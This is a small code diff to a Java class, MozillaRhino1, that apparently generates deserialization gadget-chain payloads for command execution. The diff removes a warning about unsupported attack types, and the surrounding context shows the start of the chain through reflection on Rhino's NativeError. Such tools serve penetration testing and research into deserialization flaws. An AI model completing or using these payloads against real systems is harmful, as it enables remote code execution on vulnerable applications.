@@ -28,15 +28,6 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
 
     public Object getObject(final String command, String attackType) throws Exception {
     	
-		if(!attackType.equals("exec_global")) {
-	    	
-	    	System.err.println("**********************************");
-	    	System.err.println(attackType + " not supported. Defaulting to exec_global");
-	    	System.err.println("**********************************");
-	    	System.err.println();
-	    	
-	    }
-
         Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
         Reflections.setAccessible(nativeErrorConstructor);
